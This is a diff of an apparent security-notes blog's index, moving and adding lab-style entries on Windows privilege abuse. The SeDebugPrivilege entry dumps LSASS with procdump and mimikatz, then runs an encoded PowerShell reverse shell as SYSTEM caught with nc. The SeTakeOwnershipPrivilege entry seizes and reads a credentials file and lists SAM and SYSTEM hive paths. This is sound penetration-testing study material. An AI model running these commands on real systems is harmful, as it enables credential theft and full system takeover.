@@ -1496,43 +1496,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SeDebugPrivilege</title>
-    <url>/2026/03/06/SeDebugPrivilege/</url>
-    <content><![CDATA[<blockquote>
-<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
-</blockquote>
-<blockquote>
-<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
-<ul>
-<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
-<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
-</ul>
-</blockquote>
-<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
-<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
-</blockquote>
-<p>Load Module Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
-
-<p>Run Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>Catch Shell As System  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Privesc</category>
-        <category>User</category>
-      </categories>
-  </entry>
-  <entry>
     <title>SeImpersonate and SeAssignPrimaryToken</title>
     <url>/2026/03/06/SeImpersonate-and-SeAssignPrimaryToken/</url>
     <content><![CDATA[<blockquote>
@@ -1557,6 +1520,66 @@
 
 <h2 id="Catching-SYSTEM-Shell"><a href="#Catching-SYSTEM-Shell" class="headerlink" title="Catching SYSTEM Shell"></a>Catching SYSTEM Shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  windows-privsc rlwrap nc -lvnp 8443</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
 ]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>User</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SeTakeOwnershipPrivilege</title>
+    <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : </p>
+</blockquote>
+<ul>
+<li><code>Take Ownership → Modify The DACL (ACL) → Gain Full Access</code></li>
+</ul>
+<blockquote>
+<p>➜ This can lead us to : </p>
+</blockquote>
+<ol>
+<li><p>Read protected files  </p>
+<p> Take ownership → change ACL → read sensitive files (creds, keys, flags).</p>
+</li>
+<li><p>Privilege escalation &#x2F; RCE  </p>
+<p> Take ownership of a config&#x2F;script used by a privileged service → modify it → code runs as SYSTEM&#x2F;service account.</p>
+</li>
+<li><p>Denial of Service (DoS) </p>
+<p> Take ownership → break ACLs on critical files → service&#x2F;app stops working.</p>
+</li>
+<li><p>GPO → ownership abuse (domain)</p>
+<p> Abuse GPO to grant the privilege <code>SeTakeOwnershipPrivilege</code> → then do any of the above on file shares or systems.</p>
+</li>
+</ol>
+<h4 id="Enabling-SeTakeOwnershipPrivilege"><a href="#Enabling-SeTakeOwnershipPrivilege" class="headerlink" title="Enabling SeTakeOwnershipPrivilege"></a>Enabling SeTakeOwnershipPrivilege</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-File-Ownership"><a href="#Checking-File-Ownership" class="headerlink" title="Checking File Ownership"></a>Checking File Ownership</h4><p>Check out the owner of the IT directory.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜  IT share appears to be owned by a service account <code>sccm_svc</code>.</p>
+</blockquote>
+<h4 id="Taking-Ownership-of-the-File"><a href="#Taking-Ownership-of-the-File" class="headerlink" title="Taking Ownership of the File"></a>Taking Ownership of the File</h4><blockquote>
+<p>➜ Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Confirming-Ownership-Changed"><a href="#Confirming-Ownership-Changed" class="headerlink" title="Confirming Ownership Changed"></a>Confirming Ownership Changed</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">select</span> name,directory, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123;(<span class="built_in">Get-ACL</span> <span class="variable">$_</span>.Fullname).Owner&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Name            Directory                            Owner</span><br><span class="line">cred.txt        C:\Department Shares\Private\IT      WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file"><a href="#Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file" class="headerlink" title="Modifying the File ACL ( Grant Ourself full privileges over the target file )"></a>Modifying the File ACL ( Grant Ourself full privileges over the target file )</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant htb<span class="literal">-student</span>:F</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Now we can () modify, read, etc ) the file.</p>
+</blockquote>
+<h4 id="Interesting-Files-To-Check"><a href="#Interesting-Files-To-Check" class="headerlink" title="Interesting Files To Check"></a>Interesting Files To Check</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
@@ -1761,6 +1784,43 @@
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>SeDebugPrivilege</title>
+    <url>/2026/03/06/SeDebugPrivilege/</url>
+    <content><![CDATA[<blockquote>
+<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
+</blockquote>
+<blockquote>
+<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
+<ul>
+<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
+<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
+</ul>
+</blockquote>
+<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
+<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
+</blockquote>
+<p>Load Module Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
+
+<p>Run Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>Catch Shell As System  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>User</category>
+      </categories>
   </entry>
   <entry>
     <title>Writing Custom Wordlists and Rules</title>
